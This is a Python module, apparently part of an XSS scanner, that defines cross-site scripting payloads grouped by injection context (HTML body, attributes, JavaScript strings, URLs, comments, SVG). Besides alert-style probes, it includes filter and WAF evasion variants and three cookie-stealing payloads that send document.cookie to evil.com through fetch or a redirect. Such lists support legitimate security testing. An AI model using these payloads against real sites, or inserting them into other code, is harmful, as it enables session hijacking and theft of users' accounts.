from dataclasses import dataclass, field
from typing import Optional


@dataclass
class XssPayload:
    value: str
    context: str
    description: str


PROBE_PAYLOAD = "pwnxss-probe"


HTML_BODY_PAYLOADS: list[XssPayload] = [
    XssPayload("<script>alert(1)</script>", "html_body", "Basic script injection"),
    XssPayload("<img src=x onerror=alert(1)>", "html_body", "Image onerror handler"),
    XssPayload("<svg onload=alert(1)>", "html_body", "SVG onload handler"),
    XssPayload("<body onload=alert(1)>", "html_body", "Body onload handler"),
    XssPayload("<details ontoggle=alert(1) open>", "html_body", "WAF evasion via details ontoggle"),
    XssPayload("<scr<script>ipt>alert(1)</scr<script>ipt>", "html_body", "Filter evasion via nested script tags"),
    XssPayload("<video><source onerror=\"javascript:alert(1)\">", "html_body", "HTML5 video source onerror"),
    XssPayload("<img src=x onerror=alert('XSS')//", "html_body", "Self-closing img onerror"),
    XssPayload("<img src=x:alert(alt) onerror=eval(src) alt=xss>", "html_body", "Img eval-based onerror"),
    XssPayload("<script>fetch('http://evil.com/?'+document.cookie)</script>", "html_body", "Cookie exfiltration via fetch"),
    XssPayload("<script>console.log('XSS')</script>", "html_body", "Stealth console.log (stored XSS)"),
]

ATTR_BREAKOUT_PAYLOADS: list[XssPayload] = [
    XssPayload('" onmouseover=alert(1) "', "html_attr", "Double-quote attr breakout"),
    XssPayload("' onfocus=alert(1) '", "html_attr", "Single-quote attr breakout"),
    XssPayload('"><script>alert(1)</script>', "html_attr", "Tag close + script injection"),
    XssPayload('" autofocus onfocus=alert(1) "', "html_attr", "Autofocus onfocus handler"),
    XssPayload('" onclick=alert(1)//<button \' onclick=alert(1)//> */ alert(1)//', "html_attr", "Polyglot across contexts"),
]

JS_STRING_PAYLOADS: list[XssPayload] = [
    XssPayload("';alert(1)//", "js_string", "Single-quote JS string breakout"),
    XssPayload('";alert(1)//', "js_string", "Double-quote JS string breakout"),
    XssPayload("`;alert(1)//", "js_string", "Template-literal JS string breakout"),
    XssPayload("</script><script>alert(1)</script>", "js_string", "Script tag close + open"),
    XssPayload("';document.location='http://evil.com/?'+document.cookie//", "js_string", "Cookie steal via JS breakout"),
    XssPayload("';fetch('http://evil.com/?c='+document.cookie)//", "js_string", "Cookie steal via fetch breakout"),
]

URL_CONTEXT_PAYLOADS: list[XssPayload] = [
    XssPayload("javascript:alert(1)", "url", "Javascript pseudo-protocol"),
    XssPayload("javascript:confirm('XSS')", "url", "Javascript confirm dialog"),
    XssPayload("data:text/html,<script>alert(1)</script>", "url", "Data URI script injection"),
    XssPayload("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "url", "Data URI base64-encoded script"),
]

COMMENT_BREAKOUT_PAYLOADS: list[XssPayload] = [
    XssPayload("--><script>alert(1)</script>", "html_comment", "HTML comment close + script injection"),
    XssPayload("--!><img src=x onerror=alert(1)>", "html_comment", "HTML comment close + img onerror"),
    XssPayload("--><svg onload=alert(1)>", "html_comment", "HTML comment close + svg onload"),
]


SVG_NAMESPACE_PAYLOADS: list[XssPayload] = [
    XssPayload("javascript:alert(1)", "svg_namespace", "SVG xlink:href JS protocol"),
    XssPayload("data:text/html,<script>alert(1)</script>", "svg_namespace", "SVG xlink:href data URI"),
]


def get_payloads_for_context(context: str) -> list[XssPayload]:
    mapping = {
        "html_body": HTML_BODY_PAYLOADS,
        "html_attr": ATTR_BREAKOUT_PAYLOADS,
        "js_string": JS_STRING_PAYLOADS,
        "url": URL_CONTEXT_PAYLOADS,
        "html_comment": COMMENT_BREAKOUT_PAYLOADS,
        "svg_namespace": SVG_NAMESPACE_PAYLOADS,
    }
    return mapping.get(context, [])
